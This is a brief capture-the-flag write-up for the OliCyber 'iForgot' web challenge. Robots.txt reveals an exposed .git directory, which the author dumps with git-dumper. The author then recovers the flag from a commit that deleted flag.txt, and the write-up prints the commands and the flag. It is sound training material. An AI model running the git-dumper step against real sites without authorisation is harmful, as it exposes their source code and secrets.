## Challenge Name: iForgot
**Category:** Web

**Challenge Description:**

Someone is really very confident that they have eliminated everything needed to solve the challenge, but perhaps there is still something hidden around...

Website: http://iforgot.challs.olicyber.it

### Approach

I found the ```/robots.txt``` page of this site:

```
User-agent: *
Disallow: /index.js
Disallow: /package.json
Disallow: /.git
```
I used [Git-dumper](https://github.com/arthaud/git-dumper/) to dump the git repository form the challenge site.

```
 git-dumper http://iforgot.challs.olicyber.it/ /temp
```

Than i checked the git commits.

```
git show
```
Where i found the flag:
```
commit 4f1809c610bd50d01e95de0a2996616dd883a150 (HEAD -> master)
Author: SuperHacker11 <super@hackerz.real>
Date:   Mon May 8 15:09:48 2023 +0000

    removed flag

diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index 9456de7..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-flag{0h_r34lly_d1d_u_f0rg0t_t0_r3m0v3_th3_d0t_g1t_r3p0?!}
```

**Flag**

```
flag{0h_r34lly_d1d_u_f0rg0t_t0_r3m0v3_th3_d0t_g1t_r3p0?!}
```
### Reflections
Easy difficulty challenge
  

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>
